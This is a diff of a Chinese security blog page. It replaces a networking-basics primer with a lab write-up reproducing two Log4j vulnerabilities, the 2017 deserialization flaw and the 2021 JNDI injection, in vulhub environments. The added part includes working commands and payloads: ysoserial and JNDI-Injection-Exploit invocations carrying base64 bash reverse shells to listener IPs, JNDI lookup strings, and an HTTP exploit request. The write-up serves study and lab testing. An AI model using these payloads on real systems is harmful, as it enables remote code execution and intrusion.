@@ -16,30 +16,30 @@
   <meta name="author" content="fuming">
   <meta name="keywords" content="">
   
-    <meta name="description" content="渗透基础这里总结了一下之前学习的基础知识：  域名 http  https web cdn 编码  域名IP 地址：是互联网上计算机唯一的逻辑地址，通过 IP 地址实现不同计算机之间的相互通信； 域名：域名可以看作是 IP 地址的名字，IP 地址不好记忆且没有标识性，而通过域名更有标识性更加好用； DNS：它就是连接在域名和 IP 之间的系统，可以将域名解析成 IP 地址； 子域名：一个根域名可以">
+    <meta name="description" content="Log4j漏洞复现 Log4j 反序列化漏洞介绍Apache Log4j 是一个用于 Java 的日志记录库，其支持启动远程日志服务器。 Apache Log4j 2.8.2 之前的 2.x 版本中存在反序列化漏洞。攻击者可利用该漏洞执行任意代码。 漏洞原理环境搭建 https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;log4j&#x2F;CVE-2017-5645&#x2F;  漏洞复现使用 yso">
 <meta property="og:type" content="article">
-<meta property="og:title" content="渗透基础">
-<meta property="og:url" content="https://fuyoumingyan.github.io/2023/05/30/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:title" content="Log4j漏洞复现">
+<meta property="og:url" content="https://fuyoumingyan.github.io/2023/05/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="fuyoumingyan&#39;s blog">
-<meta property="og:description" content="渗透基础这里总结了一下之前学习的基础知识：  域名 http  https web cdn 编码  域名IP 地址：是互联网上计算机唯一的逻辑地址，通过 IP 地址实现不同计算机之间的相互通信； 域名：域名可以看作是 IP 地址的名字，IP 地址不好记忆且没有标识性，而通过域名更有标识性更加好用； DNS：它就是连接在域名和 IP 之间的系统，可以将域名解析成 IP 地址； 子域名：一个根域名可以">
+<meta property="og:description" content="Log4j漏洞复现 Log4j 反序列化漏洞介绍Apache Log4j 是一个用于 Java 的日志记录库，其支持启动远程日志服务器。 Apache Log4j 2.8.2 之前的 2.x 版本中存在反序列化漏洞。攻击者可利用该漏洞执行任意代码。 漏洞原理环境搭建 https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;log4j&#x2F;CVE-2017-5645&#x2F;  漏洞复现使用 yso">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302211460.png">
-<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302214764.png">
-<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302218616.png">
-<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302217983.png">
-<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302217987.png">
-<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302231264.png">
-<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302238754.png">
-<meta property="article:published_time" content="2023-05-30T14:02:21.000Z">
-<meta property="article:modified_time" content="2023-08-31T12:05:02.625Z">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021657903.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021608726.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021647202.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021647640.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021645819.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021646802.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021643247.png">
+<meta property="article:published_time" content="2023-05-29T04:47:44.000Z">
+<meta property="article:modified_time" content="2023-09-02T15:50:30.570Z">
 <meta property="article:author" content="fuming">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302211460.png">
+<meta name="twitter:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021657903.png">
   
   
   
-  <title>渗透基础 - fuyoumingyan&#39;s blog</title>
+  <title>Log4j漏洞复现 - fuyoumingyan&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -205,7 +205,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="渗透基础"></span>
+            <span id="subtitle" data-typed-text="Log4j漏洞复现"></span>
           
         </div>
 
@@ -216,8 +216,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-05-30 22:02" pubdate>
-          2023年5月30日 晚上
+        <time datetime="2023-05-29 12:47" pubdate>
+          2023年5月29日 下午
         </time>
       </span>
     
@@ -228,7 +228,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k 字
+          1.8k 字
         
       </span>
     
@@ -239,7 +239,7 @@
         
         
         
-          12 分钟
+          10 分钟
         
       </span>
     
@@ -277,150 +277,40 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">渗透基础</h1>
+            <h1 style="display: none">Log4j漏洞复现</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="渗透基础"><a href="#渗透基础" class="headerlink" title="渗透基础"></a>渗透基础</h1><p>这里总结了一下之前学习的基础知识：</p>
-<ol>
-<li>域名</li>
-<li><em>http</em> </li>
-<li><em>https</em></li>
-<li><em>web</em></li>
-<li><em>cdn</em></li>
-<li>编码</li>
-</ol>
-<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p><em>IP</em> 地址：是互联网上计算机唯一的逻辑地址，通过 IP 地址实现不同计算机之间的相互通信；</p>
-<p>域名：域名可以看作是 IP 地址的名字，IP 地址不好记忆且没有标识性，而通过域名更有标识性更加好用；</p>
-<p><em>DNS</em>：它就是连接在域名和 <em>IP</em> 之间的系统，可以将域名解析成 <em>IP</em> 地址；</p>
-<p>子域名：一个根域名可以有很多子域名，而在进行渗透测试的时候，一些目标网站的规模比较大，主站会进行重点防御，安全性强，下手难度高。通过子域名探测，可以对目标网站下发现更多的域或子域，大大提高漏洞发现的概率，再通过这些子域，接近真正的目标；</p>
-<p>域名解析过程：</p>
-<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302211460.png" srcset="/img/loading.gif" lazyload alt="image-20230830221117344"></p>
-<p><em>host</em> 文件：这里的 “检查本机系统是否缓存” 就是检测 <em>host</em> 文件；</p>
-<p><em>host</em> 文件位置：</p>
-<table>
-<thead>
-<tr>
-<th>系统</th>
-<th>路径</th>
-<th>刷新</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>windows</code></td>
-<td><code>C:\Windows\System32\drivers\etc\hosts</code></td>
-<td><code>ipconfig /flushdns</code></td>
-</tr>
-<tr>
-<td><code>linux</code></td>
-<td><code>/etc/hosts</code></td>
-<td><code>systemctl restart nscd</code></td>
-</tr>
-</tbody></table>
-<p><em>host</em> 文件内容：IP 域名 的形式</p>
-<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302214764.png" srcset="/img/loading.gif" lazyload alt="image-20230830221430743"></p>
-<h2 id="http"><a href="#http" class="headerlink" title="http"></a><em>http</em></h2><p>HTTP：超文本传输协议，基于TCP&#x2F;IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）</p>
-<p>HTTP 遵循请求（Request）&#x2F;应答（Respose）模型，Web浏览器向Web服务器发送请求时，Web服务器处理请求并返回适当的响应。此请求只能由客户端发起，服务器不能主动向客户端发送数据；</p>
-<p>统一资源标识符（URL）：</p>
-<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302218616.png" srcset="/img/loading.gif" lazyload alt="image-20230830221802566"></p>
-<p>请求：</p>
-<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302217983.png" srcset="/img/loading.gif" lazyload alt="image-20230830221714963"></p>
-<p>响应：</p>
-<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302217987.png" srcset="/img/loading.gif" lazyload alt="image-20230830221726955"></p>
-<p>请求方法：</p>
-<ul>
-<li>get</li>
-<li>post</li>
-<li>header</li>
-<li>put</li>
-<li>delete</li>
-<li>connect</li>
-<li>options</li>
+                <h1 id="Log4j漏洞复现"><a href="#Log4j漏洞复现" class="headerlink" title="Log4j漏洞复现"></a>Log4j漏洞复现</h1><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021657903.png" srcset="/img/loading.gif" lazyload alt="Log4j"></p>
+<h2 id="Log4j-反序列化"><a href="#Log4j-反序列化" class="headerlink" title="Log4j 反序列化"></a>Log4j 反序列化</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>Apache Log4j 是一个用于 Java 的日志记录库，其支持启动远程日志服务器。</p>
+<p>Apache Log4j 2.8.2 之前的 2.x 版本中存在反序列化漏洞。攻击者可利用该漏洞执行任意代码。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/log4j/CVE-2017-5645/">https://vulhub.org/#/environments/log4j/CVE-2017-5645/</a></li>
 </ul>
-<p>状态码：</p>
-<ul>
-<li>1xx：请求成功，继续处理</li>
-<li>2xx：请求成功，处理成功</li>
-<li>3xx：重定向</li>
-<li>4xx：客户端错误</li>
-<li>5xx：服务端错误</li>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用 ysoserial 生成 payload，然后直接发送给 <code>your-ip:4712</code> 端口即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial-all.jar CommonsCollections5  <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTA0LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> | nc your-ip 4712<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021608726.png" srcset="/img/loading.gif" lazyload alt="image-20230902160848624"></p>
+<p>Base64 反弹 Shell 生成：<a target="_blank" rel="noopener" href="http://www.bu8ug.com/index.php/other/shell-base64/">http://www.bu8ug.com/index.php/other/shell-base64/</a></p>
+<h2 id="Log4j2-JNDI-注入"><a href="#Log4j2-JNDI-注入" class="headerlink" title="Log4j2 JNDI 注入"></a>Log4j2 JNDI 注入</h2><h3 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>Apache Log4j 2 是 Java 语言的日志处理套件，使用极为广泛。在其 2.0 到 2.14.1 版本中存在一处 JNDI 注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的 lookup 用于进行JNDI注入，执行任意代码。</p>
+<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/log4j/CVE-2021-44228/">https://vulhub.org/#/environments/log4j/CVE-2021-44228/</a></li>
 </ul>
-<p>常见状态码：</p>
-<ul>
-<li>200 : 客户端请求成功</li>
-<li>302： 重定向</li>
-<li>404 : 请求资源不存在</li>
-<li>400 : 客户端请求有语法错误,不能被服务器所理解</li>
-<li>401 : 请求未经授权</li>
-<li>403 : 服务器收到请求,但拒绝提供服务</li>
-<li>500 : 服务器内部错误</li>
-<li>503 : 服务器当前不能处理客户端的请求,一段时间后可能恢复正常</li>
-</ul>
-<p>请求头：</p>
-<ul>
-<li>Host：请求的服务器的域名和端口号</li>
-<li>User-Agent：客户端标识（ 操作系统、浏览器 ）</li>
-<li>Origin：谁发起的请求</li>
-<li>Referer：先前的 URL</li>
-<li>Cookie：身份验证信息</li>
-<li>x-forward-for：请求端 IP （ 可伪造 ）</li>
-<li>Accept：指定客户端接收那些MIME类型的信息</li>
-<li>Accept-Charset：指定客户端接收的字符集</li>
-<li>Accept-Encoding：指定浏览器可以支持的 web 服务器返回内容压缩编码类型</li>
-<li>Accept-Language：指定浏览器可接受的语言 </li>
-<li>Connection：表示是否需要持久连接</li>
-<li>Authorization：授权的授权证书</li>
-</ul>
-<p>响应头：</p>
-<ul>
-<li>Server：web 服务器软件名称</li>
-<li>Set-Cookie：向客户端设置 cookie，服务器向客户端发送的Cookie信息</li>
-<li>Location：重定向</li>
-<li>Refresh：应用于重定向或一个新的资源被创造，在 5 秒之后重定向</li>
-<li>Content-Type：返回内容的 MIME 类型</li>
-</ul>
-<h2 id="https"><a href="#https" class="headerlink" title="https"></a><em>https</em></h2><p>超文本传输<strong>安全</strong>协议，比HTTP（超文本传输协议）多了个安全，其实就是HTTP的升级版本，只是它比HTTP更加安全。</p>
-<p>HTTPS 安全的基础是 SSL，即在 HTTP 下加入 SSL层，也就是 HTTPS 通过安全传输机制进行传送数据，这种机制可包含网络传送的所有数据的隐秘性与完整性，可以降低非入侵型拦截攻击的可能性。</p>
-<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302231264.png" srcset="/img/loading.gif" lazyload alt="image-20230830223135226"></p>
-<p>SSL 证书部署：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/document/product/400/4143">https://cloud.tencent.com/document/product/400/4143</a></p>
-<h2 id="web"><a href="#web" class="headerlink" title="web"></a><em>web</em></h2><p><em>web</em> 环境组成：</p>
-<ul>
-<li>操作系统：linux，windows</li>
-<li>中间件（ web 服务器）：nginx，apache，iis….</li>
-<li>数据库：MySQL，SQL Server，Access，Oracle，DB2，PostgreSQL</li>
-<li>后端程序：由脚本语言编写程序实现功能，web服务器实现解析，从而使网站实现功能，如：PHP，ASP，Java，</li>
-<li>前端页面：由浏览器解析（就是我们平常看见的网站界面），如：HTML，CSS，JavaScript…</li>
-</ul>
-<p>工作流程：</p>
-<ul>
-<li>浏览器向服务器发送请求，服务器接收请求后进行判断，如果是静态文本，服务器直接做出相应响应返回给浏览器；否则让脚本语言进行解析，不涉及数据库的话就返回相应内容；涉及数据库，就执行相应操作再返回。</li>
-</ul>
-<p>具体流程：</p>
-<ol>
-<li>浏览器解析 URL</li>
-<li>生成 HTTP 请求</li>
-<li>解析 IP 地址</li>
-<li>TCP 三次握手建立连接</li>
-<li>发送 HTTP 请求</li>
-<li>服务端处理请求</li>
-<li>服务端返回响应</li>
-<li>TCP 四次挥手关闭连接</li>
-</ol>
-<h2 id="cdn"><a href="#cdn" class="headerlink" title="cdn"></a><em>cdn</em></h2><p>CDN：内容分发网络，为了提高访问速度而产生。</p>
-<p>原理：</p>
-<ul>
-<li>访问域名时，通过DNS分查找离用户最近的CDN节点（边缘服务器）的IP，访问离自己近的IP肯定要比远的要快，以此提供访问速度（那个地区的就访问自己地区或离自己近的IP，这样就快了，如下图）</li>
-</ul>
-<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302238754.png" srcset="/img/loading.gif" lazyload alt="image-20230830223833711"></p>
-<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><ul>
-<li>存储加密：md5、sha、aes</li>
-<li>传输加密：base</li>
-<li>代码加密：js 加密、后端加密</li>
-<li>数据显示：utf8、gbk</li>
-<li>其他：jwt（ cookie 中的 3 段形式，使用 . 分割，可爆破 Key ）</li>
-</ul>
-<p>识别编码：<a href="https://gitee.com/link?target=https://www.dcode.fr/identification-chiffrement">https://www.dcode.fr/identification-chiffrement</a> </p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞位置：<code>http://your_ip:8983/solr/admin/cores?action=</code></p>
+<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">$&#123;jndi:ldap://$&#123;<span class="hljs-keyword">sy</span><span class="hljs-variable">s:java</span>.<span class="hljs-keyword">version</span>&#125;.xxx.dnslog.<span class="hljs-keyword">cn</span>&#125;<br>$&#123;jndi:rmi://$&#123;<span class="hljs-keyword">sy</span><span class="hljs-variable">s:java</span>.<span class="hljs-keyword">version</span>&#125;.xxx.dnslog.<span class="hljs-keyword">cn</span>&#125;<br>$&#123;jndi:ldap://sb6vjj.dnslog.<span class="hljs-keyword">cn</span>/<span class="hljs-built_in">exp</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.323tu7.dnslog.cn&#125;</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>43.139.185.135:8983<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021647202.png" srcset="/img/loading.gif" lazyload alt="image-20230902164738050"></p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021647640.png" srcset="/img/loading.gif" lazyload alt="image-20230902164718513"></p>
+<h4 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h4><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar JNDI-Injection-Exploit-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar -C <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzkuMTg1LjEzNS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="hljs-string">&quot;43.139.185.135&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>启动后会生成 Payload，使用对应 jdk 版本的 payload 即可：</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021645819.png" srcset="/img/loading.gif" lazyload alt="image-20230902164559760"></p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021646802.png" srcset="/img/loading.gif" lazyload alt="image-20230902164615651"></p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021643247.png" srcset="/img/loading.gif" lazyload alt="image-20230902164357202"></p>
 
                 
               </div>
@@ -444,7 +334,7 @@
   
     <span>></span>
     
-  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="category-chain-item">基础知识</a>
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-chain-item">漏洞复现</a>
   
   
 
@@ -461,7 +351,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>
       
     </div>
   
@@ -473,8 +363,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>渗透基础</div>
-      <div>https://fuyoumingyan.github.io/2023/05/30/渗透基础/渗透基础/</div>
+      <div>Log4j漏洞复现</div>
+      <div>https://fuyoumingyan.github.io/2023/05/29/漏洞复现/Log4j漏洞复现/</div>
     </div>
     <div class="license-meta">
       
@@ -486,7 +376,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年5月30日</div>
+          <div>2023年5月29日</div>
         </div>
       
       
@@ -518,9 +408,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/06/05/CTF/CTF%E4%B8%AD%E7%9A%84PHP%E7%89%B9%E6%80%A7%E9%97%AE%E9%A2%98/" title="CTF 中的 PHP 特性问题">
+                      <a href="/2023/05/29/Java%E5%AE%89%E5%85%A8/JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="JNDI注入漏洞">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CTF 中的 PHP 特性问题</span>
+                        <span class="hidden-mobile">JNDI注入漏洞</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -528,8 +418,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/05/29/%E5%85%B6%E4%BB%96%E6%96%87%E7%AB%A0/Git%E5%AD%A6%E4%B9%A0/" title="git 版本控制">
-                        <span class="hidden-mobile">git 版本控制</span>
+                      <a href="/2023/05/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Shiro漏洞复现">
+                        <span class="hidden-mobile">Shiro漏洞复现</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
